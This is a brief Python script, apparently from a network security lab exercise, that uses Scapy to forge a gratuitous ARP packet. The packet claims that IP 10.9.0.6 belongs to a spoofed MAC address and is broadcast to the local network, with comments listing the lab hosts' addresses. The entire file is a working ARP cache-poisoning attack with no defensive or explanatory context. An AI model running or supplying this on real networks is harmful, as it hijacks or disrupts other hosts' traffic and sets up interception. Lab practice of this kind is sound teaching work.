from scapy.all import * 

E = Ether()
A = ARP()
E.src = "02:42:0a:09:00:96"
E.dst = "ff:ff:ff:ff:ff:ff"
A.op = 1
A.psrc = "10.9.0.6"
A.pdst = "10.9.0.6"
A.hwdst = "ff:ff:ff:ff:ff:ff"
A.hwsrc = "02:42:0a:09:00:96"


# M MAC 02:42:0a:09:00:69 IP 10.9.0.105
# B MAC 02:42:0a:09:00:06 IP 10.9.0.6 
# A MAC 02:42:0a:09:00:05 IP 10.9.0.5


pkt = E/A
pkt.show()
sendp(pkt)